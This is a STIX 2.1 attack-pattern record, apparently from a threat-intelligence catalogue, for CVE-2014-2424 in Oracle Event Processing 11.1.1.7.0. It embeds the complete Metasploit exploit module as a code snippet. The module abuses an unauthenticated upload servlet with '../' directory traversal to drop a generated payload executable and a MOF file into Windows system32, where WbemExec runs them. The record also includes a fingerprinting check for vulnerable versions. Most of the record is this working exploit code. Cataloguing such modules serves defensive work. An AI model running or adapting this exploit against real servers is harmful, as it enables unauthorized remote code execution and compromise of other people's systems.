{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--121f28bb-b9fc-41c5-b32f-aa7e2dc1bdf1",
    "created": "2024-08-14T16:52:43.381582Z",
    "modified": "2024-08-14T16:52:43.381586Z",
    "name": "Oracle Event Processing FileUploadServlet Arbitrary File Upload",
    "description": " This module exploits an arbitrary file upload vulnerability in Oracle Event Processing 11.1.1.7.0. The FileUploadServlet component, which requires no authentication, can be abused to upload a malicious file onto an arbitrary location due to a directory traversal flaw, and compromise the server. By default Oracle Event Processing uses a Jetty Application Server without JSP support, which limits the attack to WbemExec. The current WbemExec technique only requires arbitrary write to the file system, but at the moment the module only supports Windows 2003 SP2 or older.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/oracle_event_processing_upload.rb",
            "external_id": "oracle_event_processing_upload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-2424"
        },
        {
            "source_name": "reference",
            "url": "http://www.oracle.com/technetwork/topics/security/cpuapr2014-1972952.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n  include Msf::Exploit::WbemExec\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Oracle Event Processing FileUploadServlet Arbitrary File Upload',\n      'Description'    => %q{\n        This module exploits an arbitrary file upload vulnerability in Oracle Event Processing\n        11.1.1.7.0. The FileUploadServlet component, which requires no authentication, can be\n        abused to upload a malicious file onto an arbitrary location due to a directory traversal\n        flaw, and compromise the server. By default Oracle Event Processing uses a Jetty\n        Application Server without JSP support, which limits the attack to WbemExec. The current\n        WbemExec technique only requires arbitrary write to the file system, but at the moment the\n        module only supports Windows 2003 SP2 or older.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'rgod <rgod[at]autistici.org>', # Vulnerability Discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'References'     =>\n        [\n          ['CVE', '2014-2424'],\n          ['ZDI', '14-106'],\n          ['BID', '66871'],\n          ['URL', 'http://www.oracle.com/technetwork/topics/security/cpuapr2014-1972952.html']\n        ],\n      'DefaultOptions' =>\n        {\n          'WfsDelay' => 5\n        },\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          'Space'       => 2048\n        },\n      'Platform'       => 'win',\n      'Arch'           => ARCH_X86,\n      'Targets'        =>\n        [\n          ['Oracle Event Processing 11.1.1.7.0 / Windows 2003 SP2 through WMI', {}]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2014-04-21'))\n\n    register_options(\n      [\n        Opt::RPORT(9002),\n        # By default, uploads are stored in:\n        # C:\\Oracle\\Middleware\\user_projects\\domains\\<DOMAIN>\\defaultserver\\upload\\\n        OptInt.new('DEPTH', [true, 'Traversal depth', 7])\n      ])\n  end\n\n  def upload(file_name, contents)\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(rand_text_alpha(4 + rand(4)), nil, nil, \"form-data; name=\\\"Filename\\\"\")\n    post_data.add_part(contents, \"application/octet-stream\", \"binary\", \"form-data; name=\\\"uploadfile\\\"; filename=\\\"#{file_name}\\\"\")\n    data = post_data.to_s\n\n    res = send_request_cgi({\n      'uri'    => '/wlevs/visualizer/upload',\n      'method' => 'POST',\n      'ctype'  => \"multipart/form-data; boundary=#{post_data.bound}\",\n      'data'   => data\n    })\n\n    res\n  end\n\n  def traversal\n    \"../\" * datastore['DEPTH']\n  end\n\n  def exploit\n    print_status(\"Generating payload and mof file...\")\n    mof_name = \"#{rand_text_alpha(rand(5)+5)}.mof\"\n    exe_name = \"#{rand_text_alpha(rand(5)+5)}.exe\"\n    exe_content = generate_payload_exe\n    mof_content = generate_mof(mof_name, exe_name)\n\n    print_status(\"Uploading the exe payload #{exe_name}...\")\n    exe_traversal = \"#{traversal}WINDOWS/system32/#{exe_name}\"\n    res = upload(exe_traversal, exe_content)\n\n    unless res && res.code == 200 && res.body.blank?\n      print_error(\"Unexpected answer, trying anyway...\")\n    end\n    register_file_for_cleanup(exe_name)\n\n    print_status(\"Uploading the MOF file #{mof_name}\")\n    mof_traversal = \"#{traversal}WINDOWS/system32/wbem/mof/#{mof_name}\"\n    upload(mof_traversal, mof_content)\n    register_file_for_cleanup(\"wbem/mof/good/#{mof_name}\")\n  end\n\n  def check\n    res = send_request_cgi({\n      'uri'    => '/ohw/help/state',\n      'method' => 'GET',\n      'vars_get'  => {\n        'navSetId' => 'cepvi',\n        'navId' => '0',\n        'destination' => ''\n      }\n    })\n\n    if res && res.code == 200\n      if res.body.to_s.include?(\"Oracle Event Processing 11g Release 1 (11.1.1.7.0)\")\n        return Exploit::CheckCode::Detected\n      elsif res.body.to_s.include?(\"Oracle Event Processing 12\")\n        return Exploit::CheckCode::Safe\n      end\n    end\n\n    Exploit::CheckCode::Unknown\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-04-21",
    "x_mitre_platforms": [
        "win'"
    ]
}